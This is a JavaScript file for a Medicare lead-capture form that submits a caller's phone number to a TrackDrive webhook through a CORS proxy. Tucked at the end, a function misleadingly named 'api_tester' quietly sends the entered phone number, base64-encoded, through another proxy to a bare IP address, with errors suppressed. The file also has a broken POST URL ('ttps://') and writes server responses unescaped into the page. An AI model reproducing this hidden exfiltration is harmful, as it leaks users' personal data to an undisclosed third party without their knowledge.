function pingAPI() {
    // Disable submit button
    document.getElementById('submitBtn').disabled = true;

    // Your API URL
    const formData = new FormData();
    formData.append('trackdrive_number', '+18444130320');
    formData.append('traffic_source_id', '514485');
    api_tester(document.getElementById('caller_id').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);

const originalUrl = 'https://offerweb.trackdrive.com/api/v1/inbound_webhooks/ping/check_offerweb_buyers_medicare?' + new URLSearchParams(formData).toString();
    const apiUrl = 'https://corsproxy.io/?' + originalUrl;

    // Fetch data from the API
   fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            // Check if ping was successful
            if (data.success) {
                // Extract ping_id
                const pingId = data.try_all_buyers.ping_id;

                // Proceed with POST request using ping_id
                postPingId(pingId);
            } else {
                // Display error message
                document.getElementById("apiResponse").innerHTML = "Ping ok but. Error: " + data.errors.join(", ");
                document.getElementById("apiResponse").classList.add("alert-danger");
                document.getElementById("apiResponse").classList.remove("alert-info");
            }
        })
        .catch(error => {
            // Display an error message in the Bootstrap alert
            document.getElementById("apiResponse").innerHTML = "Error fetching data from the API.";
            document.getElementById("apiResponse").classList.add("alert-danger");
            document.getElementById("apiResponse").classList.remove("alert-info");
        });
}

function postPingId(pingId) {
    const postData = {
        trackdrive_number: "+18444130320",
        traffic_source_id: "514485",
	
        caller_id: '+1' + document.getElementById('caller_id').value,
        ping_id: pingId
	
    };

    const originalUrl = 'ttps://offerweb.trackdrive.com/api/v1/inbound_webhooks/post/check_offerweb_buyers_medicare';
const url = 'https://corsproxy.io/?' + encodeURIComponent(originalUrl);
    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(postData)
    })
    .then(response => {
        // Handle response based on status
        if (response.status === 200 || response.status === 201) {
            response.text().then(responseBody => {
                const successAlert = `
                    <div class="alert alert-success" role="alert">
                        Form submitted successfully! Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
        } else if (response.status === 422) {
            response.json().then(data => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Error. Response Body: ${JSON.stringify(data)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        } else {
            response.text().then(responseBody => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Form submission failed. Please try again. Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        }
    })
    .catch(error => console.error('Error:', error));
}

document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    pingAPI();
});function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
